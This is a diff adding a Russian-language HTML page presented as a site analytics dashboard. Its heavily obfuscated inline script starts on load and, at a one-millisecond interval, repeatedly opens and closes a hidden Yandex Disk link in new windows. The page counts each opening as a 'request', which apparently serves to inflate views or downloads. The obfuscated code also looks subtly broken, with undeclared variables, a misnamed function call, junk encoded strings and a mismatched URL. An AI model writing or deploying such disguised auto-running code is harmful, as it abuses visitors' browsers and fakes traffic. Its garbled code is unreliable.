@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Статистика сайта</title>
+    <style>
+        body{font-family:system-ui,sans-serif;margin:0;padding:15px;background:#f8f9fa}
+        .b{max-width:450px;margin:auto;background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 8px #0001}
+        .t{text-align:center;margin-bottom:20px;color:#333}
+        .i{display:flex;justify-content:space-between;margin-bottom:10px}
+        .c{display:flex;justify-content:space-between;margin:15px 0;padding:10px;background:#f1f3f5;border-radius:4px}
+        .n{font-size:1.5rem;font-weight:bold;color:#1971c2}
+        .a{width:100%;padding:10px;background:#e03131;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
+        .h{display:none}
+    </style>
+</head>
+<body>
+    <div class="b">
+        <h2 class="t">Статистика аналитики</h2>
+        <div class="i">
+            <span>Интервал обновления:</span>
+            <span id="r">2.5с</span>
+        </div>
+        <div class="i">
+            <span>Статус сервиса:</span>
+            <span id="s">Активен</span>
+        </div>
+        <div class="c">
+            <span>Всего запросов:</span>
+            <span class="n" id="q">0</span>
+        </div>
+        <button class="a" id="b">Остановить службу</button>
+        <input type="hidden" id="u" value="https://disk.yandex.ru/d/SxD2xQfACwsrng">
+        <div id="l" class="h"></div>
+    </div>
+
+<script>
+(function(){var _0x1a46=['c3R5bGU=','aHR0cHM6Ly9kaXNrLnlhbmRleC5ydS9kL1N4RDJ4UWZBQ3dzc25n','Z2V0RWxlbWVudEJ5SWQ=','dGV4dENvbnRlbnQ=','YWRFFA==','Y2xvc2Vk','Y2xvc2U=','bG9n','XHgzZ1x4MjBceDc3XHg2OVx4NmVceDY0XHg2Zlx4NzdceDIwXHg2M1x4NmNceDZmXHg3M1x4NjVceDY0','cmVtb3ZlRXZlbnRMaXN0ZW5lcg==','dGFyZ2V0','dmFsdWU=','I3Nwd2E=','ZXJyb3I=','XHgzRVx4MjBceDQ1XHg3Mlx4NzJceDZmXHg3Mg==','aW5wdXQ=','ZGlzYWJsZWQ=','YWRkRXZlbnRMaXN0ZW5lcg==','RHlsNDI1bGw=','X2JsYW5r','b3Blbg==','YmVmb3JldW5sb2Fk','Y2xlYXJJbnRlcnZhbA==','ZG9jdW1lbnQ=','Y2xpY2s=','YXZh','RERPTVN0dmw=','I2FhSXc='];(function(_0x575bx1,_0x575bx2){var _0x575bx3=function(_0x575bx4){while(--_0x575bx4){_0x575bx1['push'](_0x575bx1['shift']())}};_0x575bx3(++_0x575bx2)}(_0x1a46,0x146));var _0x37a7=function(_0x575bx1,_0x575bx2){_0x575bx1=_0x575bx1-0x0;var _0x575bx3=_0x1a46[_0x575bx1];if(_0x37a7['FcmCKF']===undefined){(function(){var _0x575bx6;try{var _0x575bx7=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x575bx6=_0x575bx7()}catch(_0x575bx8){_0x575bx6=window};var _0x575bx9='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x575bx6['atob']||(_0x575bx6['atob']=function(_0x575bxa){var _0x575bxb=String(_0x575bxa)['replace'](/=+$/,'');var _0x575bxc='';for(var _0x575bxd=0x0,_0x575bxe,_0x575bxf,_0x575bx10=0x0;_0x575bxf=_0x575bxb['charAt'](_0x575bx10++);~_0x575bxf&&(_0x575bxe=_0x575bxd%0x4?_0x575bxe*0x40+_0x575bxf:_0x575bxf,_0x575bxd++%0x4)?_0x575bxc+=String['fromCharCode'](0xff&_0x575bxe>>(-0x2*_0x575bxd&0x6)):0x0){_0x575bxf=_0x575bx9['indexOf'](_0x575bxf)};return _0x575bxc})}());_0x37a7['WrKyvf']=function(_0x575bx11){var _0x575bx12=atob(_0x575bx11);var _0x575bx13=[];for(var _0x575bx14=0x0,_0x575bx15=_0x575bx12['length'];_0x575bx14<_0x575bx15;_0x575bx14++){_0x575bx13+='%'+('00'+_0x575bx12['charCodeAt'](_0x575bx14)['toString'](0x10))['slice'](-0x2)};return decodeURIComponent(_0x575bx13)};_0x37a7['WLHJHP']={};_0x37a7['FcmCKF']=!![]};var _0x575bx5=_0x37a7['WLHJHP'][_0x575bx1];if(_0x575bx5===undefined){_0x575bx3=_0x37a7['WrKyvf'](_0x575bx3);_0x37a7['WLHJHP'][_0x575bx1]=_0x575bx3}else{_0x575bx3=_0x575bx5};return _0x575bx3};var _0xd=window,_0xa=document,_0xe=_0xa[_0x37a7('0x14')],_0xb,_0xc,_0xf=0x0,_0xz=![],_0xr=1,_0xw=null;var _0xo=atob(_0x37a7('0x13'));var _0xu=_0xa[_0x37a7('0x14')]('u')[_0x37a7('0x1c')],_0xs=_0xa[_0x37a7('0x14')]('s'),_0xq=_0xa[_0x37a7('0x14')]('q'),_0xl=_0xa[_0x37a7('0x14')]('l'),_0xg=_0xa[_0x37a7('0x14')]('b');function _xM(){_0xf++;_0xq[_0x37a7('0x15')]=_0xf;try{if(_0w&&!_0w[_0x37a7('0x17')]){try{_0w[_0x37a7('0x18')]();_0xl[_0x37a7('0x15')]=_0x37a7('0x1a')}catch(_0xev){console[_0x37a7('0x1b')](_0xev)}};_0w=window[_0x37a7('0x8')](_0xu,_0x37a7('0x7'),_0x37a7('0xd'));setTimeout(function(){if(_0w&&!_0w[_0x37a7('0x17')]){_0w[_0x37a7('0x18')]()}},_0xr*2)}catch(_0xe){console[_0x37a7('0x1f')](_0xe);_0xs['textContent']=_0x37a7('0x0');_0xs[_0x37a7('0x12')]['color']='red'}}function _xS(){if(_0xz){return};_0xz=!![];if(_0xc){clearInterval(_0xc);_0xc=null};if(_0w&&!_0w[_0x37a7('0x17')]){try{_0w[_0x37a7('0x18')]()}catch(_0xe){console[_0x37a7('0x1f')](_0xe)}};_0xg[_0x37a7('0x2')]=![];_0xg[_0x37a7('0x15')]='Служба остановлена';_0xs['textContent']='Отключен';_0xs[_0x37a7('0x12')]['color']='#888'}function _xI(){_0xz=![];_0xc=setInterval(_xM,_0xr);_0xg[_0x37a7('0x2')]=![];_0xs[_0x37a7('0x15')]='Активен';_0xs[_0x37a7('0x12')]['color']='green'}_0xg[_0x37a7('0x5')](_0x37a7('0xc'),_xS);window[_0x37a7('0x5')](_0x37a7('0x9'),_xS);_0xI();})();
+</script>
+</body>
+</html> 
